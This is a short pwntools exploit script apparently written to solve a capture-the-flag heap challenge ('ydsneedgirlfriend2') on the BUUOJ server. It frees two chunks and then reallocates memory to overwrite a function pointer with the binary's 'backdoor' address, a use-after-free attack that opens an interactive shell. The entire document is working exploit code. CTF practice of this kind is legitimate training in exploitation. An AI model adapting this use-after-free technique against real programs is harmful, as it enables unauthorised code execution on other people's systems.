from pwn import *
context.arch='amd64'
# context.log_level="DEBUG"

# just get shell by uaf, and there is function which could get shell

# p = process('./ydsneedgirlfriend2')
p = remote('node3.buuoj.cn',26159)
elf = ELF('./ydsneedgirlfriend2',checksec=False)

backdoor = elf.sym['backdoor']

def add(name,length):
	p.recvuntil("u choice :")
	p.send('1')
	p.recvuntil("Please input the length of her name:")
	p.send(str(length))
	p.recvuntil("Please tell me her name:")
	p.send(name)

def dele(index):
	p.recvuntil("u choice :")
	p.send('2')
	p.recvuntil("Index :")
	p.send(str(index))

def show(index):
	p.recvuntil("u choice :")
	p.send('3')	
	p.recvuntil("Index :")
	p.send(str(index))

def debug():
	gdb.attach(p)
	pause()

add('AAAA',0x20)
add('BBBB',0x20)
# debug()
dele(0)
dele(1)
add('C'*8+p64(backdoor),0x10)
show(0)
# debug()
p.interactive()
